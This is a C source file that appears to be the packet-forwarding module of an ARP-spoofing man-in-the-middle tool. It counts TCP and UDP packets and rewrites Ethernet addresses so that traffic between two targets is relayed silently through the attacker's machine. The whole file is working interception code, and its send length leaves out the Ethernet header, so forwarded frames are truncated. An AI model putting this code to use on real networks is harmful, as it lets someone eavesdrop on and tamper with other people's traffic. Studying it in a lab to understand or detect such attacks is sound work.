#include <stdio.h>
#include <pcap/pcap.h> // for pcap_pkthdr
#include <netinet/ip.h> // for IPPROTO_TCP IPPROTO_UDP
#include <string.h> // for memcmp
#include <stdlib.h> // for exit
#include <errno.h> // for errno strerror
#include <unistd.h> // for usleep
#include "header.h"
#include "packet_forward.h"

int count_tcp = 0;
int count_udp = 0;
int count_other = 0;

static int get_packet_size(const u_char *packet) {
	struct ip_header *ip_hdr = (struct ip_header*)(packet + 14);
	return ntohs(ip_hdr->total_length);
}

static void change_ethernet_address(u_char *packet, struct spoofing_attack *spoofing_attack) {

	struct ethernet_header *eth_header = (struct ethernet_header*)packet;
	
	if (memcmp(spoofing_attack->target1_ethernet_address, eth_header->source, ETH_ALEN) == 0) {
		memcpy(eth_header->source, spoofing_attack->man_in_the_middle_eth_address, ETH_ALEN);
		memcpy(eth_header->destination, spoofing_attack->target2_ethernet_address, ETH_ALEN);
	}

	if (memcmp(spoofing_attack->target2_ethernet_address, eth_header->source, ETH_ALEN) == 0) {
		memcpy(eth_header->source, spoofing_attack->man_in_the_middle_eth_address, ETH_ALEN);
		memcpy(eth_header->destination, spoofing_attack->target1_ethernet_address, ETH_ALEN);
	}
}

static void forwarding(u_char *packet, struct spoofing_attack *spoofing_attack) {
	
	struct sockaddr sockaddr;
	strncpy(sockaddr.sa_data, spoofing_attack->interface_name, sizeof(sockaddr.sa_data));

	if(sendto(spoofing_attack->send_socket, packet, get_packet_size(packet), 0, &sockaddr, sizeof(sockaddr)) < 0) {
		printf("\nFailed to send forwarding : %s\n", strerror(errno));
		return;
	}
}

static void packet_count(const u_char *packet) {

	struct ip_header *ip_hdr = (struct ip_header*)(packet + 14);
	switch(ip_hdr->protocol) {
		case IPPROTO_TCP: count_tcp += 1; break;
		case IPPROTO_UDP: count_udp += 1; break;
		default: count_other += 1; break;
	}
	printf("\rTCP: %d Packet , UDP: %d Packet , OTHER: %d Packet", count_tcp, count_udp, count_other);
}

void forward(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

	struct spoofing_attack *spoofing_attack = (struct spoofing_attack*)args;	

	packet_count(packet);

	u_char fowarding_packet[get_packet_size(packet)];
	memcpy(fowarding_packet, packet, get_packet_size(packet));

	change_ethernet_address(fowarding_packet, spoofing_attack);

	forwarding(fowarding_packet, spoofing_attack);

	// To avoid No buffer space available Error.
	usleep(100);
}
